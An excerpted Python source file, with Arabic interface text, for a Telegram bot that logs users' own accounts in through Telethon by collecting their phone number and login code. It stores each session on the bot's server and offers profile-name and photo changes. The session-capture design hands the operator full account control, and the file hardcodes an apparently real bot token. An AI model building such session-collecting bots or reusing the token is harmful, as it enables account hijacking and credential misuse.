...
BOT_TOKEN = '8344790747:AAGemW8Ii4etBbV7BpzP8OJ-MHyhBuEVd9Y'  # ضع توكن البوت الخاص بك

# قاموس لتخزين بيانات المستخدمين أثناء التسجيل
user_sessions = {}
...
async def show_login_menu(event):
    ...
    await event.reply(
        "🔒 **مرحباً بك في بوت التحكم بالحساب**\n\n"
...
async def start_login_process(event):
    ...
    await event.edit(
        ...
        "مثال: +201234567890",
        buttons=[[Button.inline("🔙 رجوع", b"help")]]
    )
...
async def show_help(event):
    await event.edit(
        ...
        "انقر على زر تسجيل الدخول للبدء:",
...
async def handle_login_steps(event):
    ...
    try:
        if step == 'phone':
            ...
            # إنشاء عميل جديد
            session_data['client'] = TelegramClient(f'sessions/{user_id}', API_ID, API_HASH)
            ...
            # تحويل الكود من "1 2 3 4 5" إلى "12345"
            code = code.replace(' ', '')
            ...
            try:
                ...
                await event.reply(
                    ...
                    f"👤 الاسم: {me.first_name or 'غير محدد'}\n"
                    f"📞 الهاتف: {me.phone}\n"
                    f"🔗 اليوزر: @{me.username or 'غير محدد'}\n\n"
...
async def change_profile_start(event):
    ...
    await event.edit(
        ...
        "الرجاء إرسال الصورة التي تريد وضعها كصورة ملفك الشخصي:",
        buttons=[[Button.inline("🔙 رجوع", b"help")]]
    )
...
async def change_name_start(event):
    ...
    await event.edit(
        "✏️ **تغيير اسم الملف الشخصي**\n\n"
        "الرجاء إرسال الاسم الجديد:",
        buttons=[[Button.inline("🔙 رجوع", b"help")]]
    )
...
async def auto_change_start(event):
    ...
    await event.edit(
        "🔄 **التغيير المتكرر للصورة**\n\n"
        "هذه الميزة تسمح بتغيير الصورة عدة مرات تلقائياً\n\n"
        "سيتم إضافتها في تحديث قريب!",
        buttons=[[Button.inline("🔙 رجوع", b"help")]]
    )
...
async def account_info(event):
    ...
    await event.edit(
        f"📊 **معلومات الحساب**\n\n"
        f"👤 الاسم: {user_info['first_name'] or 'غير محدد'}\n"
        f"📞 الهاتف: {user_info['phone']}\n"
        f"🔗 اليوزر: @{user_info['username'] or 'غير محدد'}\n\n"
        f"🆔 ID: {user_id}",
        buttons=[[Button.inline("🔙 رجوع", b"help")]]
    )
...
async def logout_user(event):
    ...
    buttons = [
        [Button.inline("✅ نعم، تأكيد", b"confirm_logout"), Button.inline("❌ إلغاء", b"help")]
    ]
    
    await event.edit(
        "🚪 **تسجيل الخروج**\n\n"
        "هل أنت متأكد من أنك تريد تسجيل الخروج؟\n"
        "سيتم إغلاق جلسة حسابك في البوت.",
        buttons=buttons
    )
...
async def check_user_login(user_id):
    ...
    if not user_sessions[user_id].get('logged_in'):
        return False
